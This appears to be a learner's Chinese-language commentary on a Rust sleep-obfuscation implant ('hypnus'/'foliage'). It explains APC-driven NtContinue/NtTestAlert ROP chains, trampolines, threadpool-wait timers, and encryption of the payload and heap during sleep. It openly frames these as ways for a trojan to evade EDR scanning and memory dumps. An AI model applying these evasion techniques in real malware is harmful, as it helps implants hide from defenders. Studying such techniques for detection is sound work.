// 扩展:正常程序如果声明一个巨大的局部变量(如 char buffer[102400]; 即100k的栈缓冲区),那么也会出现撞向未提交页面和绕过保护页的情况.但正常程序没有崩溃,在于编译器(如MSVC GCC Clang Rustc)后台使用一种栈探测Stack Probing的机制,即 _ _chkstk 栈探测函数
// 编译器发现某个函数内部申请的栈空间超过一个页面4kb的大小时.编译器不会直接生成sub rsp,102400这样的指令,而是在函数入口强行插入对系统底层函数_ _chkstk的调用的指令.
// 该函数由微软运行时库提供,它在内部执行一个循环,以4kb为步长,借用临时寄存器(win64下是rcx)复制当前rsp,然后逐步sub rcx,4096,再用test [rcx],eax去触碰该页面,强制触发PAGE_GUARD异常,让内核提交内存.这样确保每一个PAGE_GUARD保护页都按顺序被触发,最后一次性执行sub rsp,rax,把rsp挪到最终位置.这样,内核一页一页的提交内存,直到申请的栈大小全部被提交后. __chkstk  才会正式将  RSP  指针修改为最终的目标地址，并返回

// 注释2
//  &mut ctx_init: 栈上获取本地变量ctx_init的唯一可变引用,其类型是&mut CONTEXT
// as *mut _:跨越安全边界并自动推导类型,将安全的可变引用&mut 强制转为*mut(裸指针).这里的 _ 是类型占位符,作用是让Rustc根据上下文自动推导目标类型,可以提高代码的移植性避免冗长的类型声明.因为,CONTEXT可能来自不同的第三方库(puerto/dinvk)

// 注释3
// 如何从外部链接到本项目的:在winapis.rs中有对NtSetEvent2的定义(作为一个封装的中转函数)
// 其内部调用NtSetEvent win api需要2个参数,
// 但是根据TpAllocTimer的约定,其代表回调函数的参数要符合PTP_TIMER_CALLBACK(等待定时器回调函数原型),该原型接收3个参数.
// 但是后续的wait模式(使用TpAllocWait注册,其回调的参数要符合PTP_WAIT_CALLBACK(等待事件回调函数原型),接收4个参数).为了方便后续复用,将ntsetevent2直接设计为4个参数
// 在混淆逻辑运行时,调用NtSetEvent2的是win线程池的工作线程(worker thread).当线程池触发定时器跳到NtSetEvent2时,工作线程内部会执行给寄存器赋值操作
// 第一个定时器使用trampolie 第二个定时器使用wrapper函数:核心原因是 RtlCaptureContext本身就是捕获当前寄存器状态的,如果使用wrapper RtlCaptureContext的方式,明显会由于proluge 和 尾声 破坏当前寄存器状态.
// 而tampoline(mov rcx,rdx xor rdx,rdx jmpQWORD PTR [rcx])其物理上直接jmp到RtlCaptureContext.
// 它没有proluge:没有修改栈的指令,栈状态干净;使用jmp而不是call 无条件跳转不向栈压入返回地址.
// 在cpu看来 和线程池内核调度器直接调用一样,从而抓到完美的,没有代码痕迹的工作线程快照.
// 而 NtSetEvent 这个win api 根本不关心调用者的栈和寄存器状态,它无所谓被包装函数修改

// 注释4
// 这涉及rust中ffi的类型强转机制和rust编译器的安全保证
// 1. 隐式类型转换(Implicit Coercions):rust中存在引用到裸指针的隐式强转.
// &mut T 可隐式且安全的强转为 *mut T
// &T 可隐式且安全的强转为 *const T

// 注释5
// win64 fast call的前四个参数通过rcx,rdx,r8,r9传递.发生函数调用时,调用者在栈上为这4个寄存器预留32字节shadow sapace,用于被调用函数在必要时将寄存器的值写回/备份到栈上,这4个栈槽称为Parameter Home.
// P1Home是CONTEXT的第一个成员,偏移量为0,在语义上代表RCX(即第一个参数备份槽).但在CONTEXT中,P1Home只是结构体头部的8字节,并不等同RCX寄存器本身,RCX在结构体后面有独立的专属字段
// rcx寄存器本身是cpu内部的一组物理触发器/锁存器,是由晶体管直接构成的硬件存储单元,位于cpu内部的寄存器堆中.其读写与cpu主频同步,远快于内存.在一个逻辑cpu核心中,物理上只有一个rcx寄存器,它没有内存地址,无法对rcx寄存器进行&
// P1Home其本质是ram中的一个8字节存储单元.由明确的内存地址(位于堆或栈上).cpu无法直接在P1Home内部进行运算,必须先用mov 将其读入到某个物理寄存器上,运算后再写回内存.
// 为啥要在CONTEXT结构体的开头定义P1Home这个字段?
// win32下,函数参数全部通过内存栈传递;win64下,为了提升速度,前四个参数用寄存器传递,且caller必须在栈上预留32字节的shadow space,这个四个槽位在内核中被称为P1Home-P4Home.这四个槽位为了操作对应的寄存器中的值(写入或读取对应寄存器中的值)
// 既然这四个槽位只是栈上参数的备份,为啥要定义在CONTEXT中呢?
// 当win发生异常,cpu从用户态转为内核态,内核调用异常分发函数.为了调用异常处理函数,内核必须在栈上为其准备好调用环境,包括异常处理函数需要接收的参数,依照win64 fast call在栈上预留了四个参数的Home槽.为了让内核的汇编代码在处理异常时方便,微软把这个4个Home槽设计在CONTEXT结构体的开头处
// 以上,在一个CONTEXT结构体中,ctx.rcx保存的是当前程序崩溃/挂起的瞬间,cpu硬件rcx寄存器中的数据,这个数据是线程的真实运行状态;ctx.P1Home保存的是为了调用异常处理函数,在栈上预留的第一个参数的影子空间.线程在正常运行时,这里通常是空或垃圾数,内核在回复线程时根本不去读取它.
// 但在wait函数中,并没有使用异常机制.
// 木马在开始混淆之前,必须抓取worker thread的寄存器快照.如果直接调用RtlCaptureContext,编译器会生成call指令.而call会污染当前调用栈(把当前函数的返回地址压栈),且可能因为函数进入/退出(prologue和epilogue)修改rsp和rbp.
// 为了避开call,这里用了trampoline使用jmp跳转到rcx内存地址中存放的函数.在trampoline中最后一句`jmp qword ptr [rcx]`,cpu读取rcx指向的内存开头的8字节,把这8字节当成函数地址并跳进去.此时,rcx指向的是ctx_init结构体,其开头的8字节就是P1Home.等于劫持了P1Home字段,把RtlCaptureContext地址塞了进去.
// 这是一种纯粹利用物理内存布局实现汇编间接跳转的技巧

// 注释6
// 1. 内存在内存中申请一块TP_WAIT结构体,并将地址返回给临时的wait变量
// 2. 绑定相同的trampoline:每个任务被触发时,worker thread去执行的都是self.cfg.callback(关于 NtContinue的汇编跳板)
// 3. 绑定不同的上下文:虽然都是调用NtContinue,但每次驯悍传入的CONTEXT是不同的.分别指向ctxs[0]到ctxs[9]这10个不同的cpu快照
// 4. 绑定私有环境:所有任务都挂载在env上,确保只在私有的单线程池中运行

// 注释7
// 为何要让10个wait对象都等待events[0]
// 1. tpsetwait的函数原型要求必须传入一个内核对象句柄.如果传入null_mut()空指针,windows会认为想要注销/取消这个等待任务.会立即取消监听,即使传入了有效的timeout也不会触发.那么既然需要一个有效的内核对象句柄,又不希望其他事件打扰既定的时序,那么需要传入一个永远不会被active的占位句柄.events[0]初始是unsignaled,后续又没有active.那么这10个对象等待events[0]就永远等不到active,只能通过超时触发
// 2. OPSEC:为啥不直接用系统原生tpsettimer而是使用等待对象 + 占位句柄来模拟定时器.因为传统木马在运行休眠时,都会调用Sleep/DelayExecutive/线程池的tpsettimer,因此edr对于时间延迟直接相关的api下了极重的hook和行为特征检测.相比之下,tpsetwait用来做正常的线程同步和锁等待的(如 文件读写,等待命名管道),将危险行为混淆在大量的正常的调用中

// 注释8
// 1. 为什么要加密堆.当木马运行后,会动态申请内存(堆内存)存放各种敏感信息,如c2的域名,ip,url,解密后的敏感字符串,api导入表,即将发回c2的数据.即便木马的shellcode再完美,如果堆中出现这些敏感信息的明文,当edr定期扫描进程内存时,会瞬间被识破
// 在这一步之前 worker thread已经通过ROP链将主载荷(代码段)加密(ctxs[2]的SystemFunction040).这里再由主线程把私有堆(数据段)也全部加密.至此,在后续指定时间(ctxs[5])的休眠期中,该进程在内存中的代码段和数据段同时处于加密乱码状态.无论edr扫描还是memory dump都拿不到有意义的数据.
// 该段发生在主线程挂起NtSignalAndWaitForSingleObject前最后一刻,同步且快速执行堆加密,保证数据在休眠的瞬间立刻锁死,避免时间差带来的特征泄露.且只能由主线程同步执行,因为xor堆加密需调用RtlWalkHeap递归遍历堆链表,且需要循环运算.无法通过简单的寄存器传参和ROP链(NtContinue)静态拼接出来.

// 注释9
// 该双重同步原语
// 在多线程或异步编程中,若想点亮A事件后,立刻等待B事件.传统方式: 1. NtSetEvent[A] 2. NtWaitForSingleObject[B] .这种方式存在致命缺陷,在这两步之间cpu可能发生线程上下文切换Thread Context Switch.一旦主线程在第一步执行完后被挂起,worker thread可能在主线程没来及执行第二步(NtWaitForSingleObject[B] 进入等待状态)前,就已经跑完了所有任务并去尝试点亮B.虽然win的事件状态有记忆,但这种时序上的空挡会造成逻辑上的混乱,以及被edr抓取到瞬时的异常调用状态
// 而NtSignalAndWaitForSingleObject:通过一次syscall陷入Ring 0内核,在内核调度器锁定状态下,原子化完成点亮A并将当前线程挂起去等待B.从而杜绝任何中间线程抢占或打断的可能
// 这里events[2]表示要点亮的内核对象句柄; events[3]表示要挂起等待的内核对象句柄; 0 是否进入警惕状态; null_mut()在超时时间的参数位置上,代表无限等待.

// 注释10
// APC,asynchronous procedure call异步调用过程:是win内核提供的一种基础同步机制,运行os或应用程序在特定线程上下文环境中,异步执行一段指定的函数/过程.
// 根据调用约定和运行级别,win下的APC分为:1. 内核模式APC:由内核或驱动程序使用,通常用于系统底层任务(如 异步IO操作的完成).其优先级高于用户态代码,一旦触发,内核会强制中断当前线程的用户态执行流,切入内核态执行该APC;
// 2. 用户模式apc:由用户态应用程序使用(通过 Win32 API QueueUserAPC 或内核 Native API NtQueueApcThread),用户态apc的执行是被动的.当向某线程发送apc任务后,该任务会排在线程apc队列中.只有当目标线程主动调用特定的同步函数并进入alertable state警惕状态时,内核才会派发并执行队列中的apc.常见使线程进入警惕态的api:SleepEx(..., TRUE),WaitForSingleObjectEx(..., TRUE),SignalObjectAndWait(..., TRUE),MsgWaitForMultipleObjectsEx(..., QS_ALLINPUT, MWMO_ALERTABLE)
// 3. 特殊用户模式apc:win10 19041及后续版本适用.特殊用户模式apc不需要线程处于alertable state状态即可强制执行.主要为了支持底层的环形缓冲区ring buffer和高并发异步IO调度,减少不必要的线程上下文切换开销.但win10/11,也推出了ETW-Ti（Threat Intelligence)内核遥测接口,当任何进程尝试调用NtQueueApcThread向另一进程的线程注入apc时,内核会通过ETW-Ti产生遥测事件,获取该动作的完整上下文,这使得传统的跨进程apc注入极易被查杀.

// 注释11
// 如果在foliage函数开始运行就使用RtlCaptureContext抓主线程快照,抓到的是正在运行的,正在修改栈帧的主线程状态.
// 在ctx[3]执行时,已经:1.主线程调用NtSignalAndWaitForSingleObject进入内核挂起 2. 傀儡线程在后台运行到ctxs[3],调用NtGetContextThread抓取主线程快照.那么此时抓到的ctx_backup记录的是主线程正在NtSignalAndWaitForSingleObject挂起的寄存器状态
// 为啥要将抓取此时的状态,作为还原点:
// 1. 防止栈崩溃:如果在ctxs[8]中把主线程恢复为刚进入foliage函数时的初始状态.主线程会在不该被唤醒的时候苏醒,甚至直接执行函数的ret返回,此时工作线程还在运行,会导致主线程的局部变量和栈空间瞬间被写坏,直接蓝屏或闪退.
// 2. 把主线程还原为正在等h_thread信号的挂起状态.当傀儡线程在最后异步ctxs[9]调用RtlExitUserThread退出时,h_thread句柄在内核中会自动actived.
// 3. 主线程被还原为正在h_thread状态,检测到信号后,会自然的从NtSignalAndWaitForSingleObject醒来,继续详细执行后面的清理代码.

//注释12
//  1. 排队阶段-FIFO队列:
// APC在win内核中是一种queue.可以向一个线程连续发送多个APC任务.当该线程进入可告警状态(alertable)被唤醒时,它会按顺序(FIFO)逐个执行queue中任务.这种时序也契合ROP链的要求
// NtQueueApcThread向傀儡线程依次塞入10个以NtContinue为执行入口的上下文(ctxs[0..9])
// 当傀儡线程通过NtAlertResumeThread醒来并进入可警告状态时,内核会提取队列中的第一个任务,代为执行NtContinue(&ctxs[0])
// 2. 防止ROP chain中断与栈崩溃
// NtContinue会强行用ctxs[0]的数据覆盖cpu寄存器,使其执行的敏感API(如NtWaitForSingleObject).问题时,当该API执行完毕准备返回(ret)时,cpu会从当前的RSP弹出一个返回地址,这种环境下弹出的返回地址可能是垃圾地址,即使是合法地址也会退出,不再继续执行ROP链.因为:
// 正常程序中,函数的调用是通过call实现的,在执行call时:cpu自动把下一个指令的地址(即返回地址)压入RSP指向的位置;下一步跳转到TargetFunc执行;TargetFunc执行完毕,ret,cpu自动从当前RSP弹出一个地址,跳过去继续执行.因此,有call指令自动压栈在先,ret弹出的必定是合法的返回地址.
// 而源码环境下,没有使用call.而是用NtContinue强行将cpu寄存器改写(将RIP改成敏感api地址,把rsp改为伪造的rsp).cpu没有在假栈顶压入任何返回地址.所以当敏感api执行完毕ret时,cpu仍机械的读取rsp指向的8字节内存.如果没有在这个rsp的8字节写入有效代码地址,那就可能是对应内存页之前残留的随机数据,cpu会强行跳过,自然会触发Access Violation非法内存访问,导致进程崩溃
// 即使给了一个合法地址,线程也会退出或卡死,导致后面的apc丢失.
// 即使给了一个合法返回地址.如空的ret或系统dll的安全返回点.api执行ret,跳到合法地址,程序不会崩溃了,但后续9个apc任务会丢失.因为(涉及win内核分发apc的硬性契约):
// a. 用户态apc的启动条件:内核只有检测到线程处于alertable状态,才会去派发用户态apc队列; b. 执行期间的状态变化:当内核发现队列有ctxs[0],并派发执行NtContinue(&ctxs[0])时,该线程已经脱离alertable,进入普通执行状态; c. 常规返回后果:当ctxs[0]内的api跑完,ret到给定的合法地址后,线程会顺着这个合法地址继续往下执行普通代码
// 那么此时线程处于普通执行态,不是alertable.那么内核就不会主动去queue中继续拿ctxs[1]执行.结果线程要么卡在合法地址的无限循环,要么顺着代码执行到ExitThread退出.留在内核queue后续的9个apc永远不会执行
// 3. 解决方案NtTestAlert-在栈顶注入NtTestAlert的环形驱动:NtTestAlert是win提供的undocumented系统调用,作用:强迫内核现在立刻检查当前线程的apc队列,如果发现有未执行的apc,立刻进行分发.我们将每个ctx的返回地址都设为NtTestAlert.当ctxs[N]执行完毕ret时,cpu跳入NtTestAlert.内核检查队列还有其他ctx[N+1]未执行,于是立刻执行NtContinue(&ctxs[N+1])
// 为了让链条自动流转,在spoof.rs伪造每个ctx栈顶时,强行往栈顶写入ntdll.dll!NtTestAlert 的内存地址：*(ctx.Rsp) = NtTestAlert_Addr.这个执行闭环:
// [步骤 A] 内核分发 APC ──► 执行 NtContinue(&ctxs[N])
// [步骤 B] CPU 强行跳转 ──► 运行 ctxs[N] 指定的 API（如加密/休眠）
// [步骤 C] API 运行结束 ──► 执行 ret 指令
// [步骤 D] 栈顶劫持跳转 ──► ret 弹出栈顶的 NtTestAlert 地址并跳入执行
// [步骤 E] 内核清空队列 ──► NtTestAlert 触发内核去检查当前线程的 APC队列.发现队列中还有 ctxs[N+1]，从而自动触发下一次 [步骤 A]
// 这种“执行完 API -> ret 到 NtTestAlert -> 触发下一个APC”的环形设计10个离散的 CONTEXT状态机在不需要任何用户态跳转代码的前提下，完全在内核的驱动下实现了完美串联
// 优势:无用户态特征跳转：一般人写 ROP 链，需要用 jmp rax 或 call rbx在用户态内存里跳来跳去，EDR 挂个硬件断点或者做行为审计很容易拦截
// 全内核接管：在 foliage 中，从第 1 步到第 10步的跳转，全部是利用系统底层的 ret -> NtTestAlert -> 内核分发 APC完成的。对于 EDR 来说，它只能看到一个合法的系统线程在不断地接收和处理系统的APC 信号，其行为特征完全符合操作系统的合法调度逻辑

// 注释13
// 在hypnus整个项目中,为了达到休眠期间全内存无特征的效果.hypnus将内存划分为主载荷区(代码段),私有堆(数据段),栈与控制区
// 1. 主载荷区-.text代码段
// -属性:RX(运行期)<----->RW(加密期)
// -存放:shellcode/恶意核心载荷代码
// -加密:异步ROP链(SystemFunction040)

// 2. 私有堆(HypnusHeap 数据段)
// -属性:RW
// -存放:载荷运行期动态申请的内存(变量,配置,缓存)
// -加密:主线程同步遍历(RtlWalkHeap+XOR)

// 3. 栈与控制区
// -属性:RW
// -纤程栈(Fiber Stack):1MB物理隔离栈,承载FFI跳板与局部变量
// -伪造栈:用于欺骗ED回溯(ZwWaitForWork..链)

// foliage中,apc注入的10个ctxs任务,在物理上始终存放在主线程的栈帧中.10个ctxs([ctx_init; 10]),主线程执行foliage函数的当前局部栈帧上开辟出连续的空间(sizeof(CONTEXT) * 10 约12KB)
// 下一步需要傀儡线程访问10个ctx:使用NtQueueApcThread将10个ctx投递给傀儡线程h_thread.主线程调用NtSignalAndWaitForSingleObject挂起,但主线程的栈并没有销毁,主线程栈上的12kb空间依然完好存于内存.
// ->傀儡线程被唤醒,开始执行APC队列中的任务.内核代为执行NtContinue(&ctxs[N]),cpu会根据指针直接跨线程读取主线程栈上对应的CONTEXT数据.这符合win进程虚拟内存共享的设计:同一进程内的所有线程,可以自由读取其他线程的栈空间数据.
// 此外,hypnus.rs入口hypnus_entry,ConvertThreadToFiber(null_mut());把当前线程转为fiber,在fiber中跑foliage:如果在主线程上跑foliage,在主线程执行将10个ctx投递给apc,那么一旦rust的函数执行完毕,主线程的栈帧会被立刻收回销毁(栈回退,原空间被后续函数覆盖成垃圾数据).通过将主线程包装成fiber,并在fiber的独立上下文中运行,fiber拥有自己独立的,由我们自己手动控制生命周期的1MB栈空间,只要不显示调用DeleteFiber,这块栈空间在混淆期间会安全驻留内存,不会被os收回或覆盖.这保证傀儡线程在整个休眠期,随时安全的跨线程读取位于主线程fiber栈上的10个ctx任务.
// fiber没有违背rust销毁局部变量的约定,rust的RAII和局部变量销毁规则依然有效.导致这块栈空间和其中ctxs变量不会被销毁的原因在于,rust物理内存页的管理权高于编译器,作用域的执行流被os挂起
// 1. rust销毁局部变量的触发条件是执行流离开作用域.由于主线程在NtSignalAndWaitForSingleObject被os挂起,cpu停止执行当前线程的代码.那么执行流就没有走到函数结尾(}),从rustc语义来看,ctxs依然处于它的生存作用域内.因此,rustc自动生成的清理代码Drop析构函数,并没有执行
// 2. 纤程栈的生命周期:普通局部变量的栈,由当前cpu的rsp寄存器决定,在普通函数调用中,一旦函数通过ret返回,rsp会弹出,原来的栈空间会被后续其他函数栈帧覆盖;而fiber的栈,在调用CreatFiber时,win内核在heap区申请一块1MB的物理虚拟内存页,将rsp指向这块内存的末尾作为fiber的专属栈.只要不主动调用DeleteFiber,os内核就会在内存中保留这1MB内存页,不会将其回收或分配给其他人.主线程在休眠期,其rsp依然指向这个fiber栈,这块1mb的内存数据依然完好,ctxs的数据也完好.
// 3. rustc只负责在编译时,在函数结尾插入栈回退和变量清理的机器码;os则负责在运行时,控制cpu是否执行这些机器码,以及控制物理内存页的存留.我们通过os调用,让os在运行期间把线程冻结在函数中段,所以编译器在编译期写好的销毁局部变量的指令就没有机会运行.一旦工作线程把主线程唤醒,主线程恢复执行,跑完foliage函数并退出fiber,执行流到达函数结尾}.rustc才会去销毁这些变量,随后主线程调用DeleteFiber,os把这1mb内存还给系统.这完全符合rust内存安全规范.
